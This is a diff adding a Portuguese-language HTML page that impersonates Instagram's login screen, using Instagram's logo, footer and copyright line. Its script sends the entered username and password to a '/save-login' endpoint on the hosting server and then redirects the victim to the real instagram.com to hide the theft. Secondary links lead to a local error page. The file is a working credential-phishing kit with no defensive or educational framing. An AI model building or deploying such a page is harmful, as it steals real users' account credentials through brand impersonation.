@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Login Page</title>
+    <link rel="stylesheet" href="styles.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+</head>
+<body>
+<div class="wrapper">
+    <div class="header">
+        <div class="top">
+            <div class="logo">
+                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
+            </div>
+            <div class="form">
+                <div class="input_field">
+                    <input type="text" id="username" placeholder="Telefone, nome de usuário ou email" class="input">
+                </div>
+                <div class="input_field" style="position: relative;">
+                    <input type="password" id="password" placeholder="Senha" class="input" style="width: 100%; padding-right: 60px;">
+                    <span id="togglePassword" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #0095f6; font-weight: bold; font-size: 12px;">Mostrar</span>
+                </div>
+                <div id="error-message" style="color: red; font-size: 14px; display: none;">Por favor, preencha todos os campos.</div>
+                <div class="btn">
+                    <a href="#" id="loginBtn">Entrar</a>
+                </div>
+            </div>
+            <div class="or">
+                <div class="line"></div>
+                <p>OU</p>
+                <div class="line"></div>
+            </div>
+            <div class="dif">
+                <div class="fb">
+                    <img src="images/facebook.png" alt="facebook">
+                    <a href="error.html"><p>Entrar com o Facebook</p></a>
+                </div>
+                <div class="forgot">
+                    <a href="error.html">Esqueceu a senha?</a>
+                </div>
+            </div>
+        </div>
+        <div class="signup">
+            <p>Não tem uma conta? <a href="error.html">Cadastre-se</a></p>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="container">
+            <ul>
+                <li><a href="#">Meta</a></li>
+                <li><a href="#">Sobre</a></li>
+                <li><a href="#">Blog</a></li>
+                <li><a href="#">Carreiras</a></li>
+                <li><a href="#">Ajuda</a></li>
+                <li><a href="#">Api</a></li>
+                <li><a href="#">Privacidade</a></li>
+                <li><a href="#">Termos</a></li>
+                <li><a href="#">Localizações</a></li>
+                <li><a href="#">Threads</a></li>
+                <li><a href="#">Meta Verified</a></li>
+            </ul>
+        </div>
+        <div class="copyright">
+            © 2024 Instagram from Meta
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginBtn').addEventListener('click', function (e) {
+        e.preventDefault(); // Prevenir o comportamento padrão do link
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const errorMessage = document.getElementById('error-message');
+
+        // Limpar mensagem de erro
+        errorMessage.style.display = 'none';
+
+        // Verificar se os campos estão preenchidos
+        if (!username || !password) {
+            errorMessage.style.display = 'block';
+            return;
+        }
+
+        // Enviar os dados para o backend
+        fetch('/save-login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password }),
+        })
+        .then(() => {
+            // Redirecionar para o site oficial do Instagram
+            window.location.href = 'https://www.instagram.com';
+        })
+    });
+
+    // Função para exibir/ocultar a senha
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordField = document.getElementById('password');
+
+    togglePassword.addEventListener('click', () => {
+        if (passwordField.type === 'password') {
+            passwordField.type = 'text';
+            togglePassword.textContent = 'Ocultar';
+        } else {
+            passwordField.type = 'password';
+            togglePassword.textContent = 'Mostrar';
+        }
+    });
+</script>
+</body>
+</html>
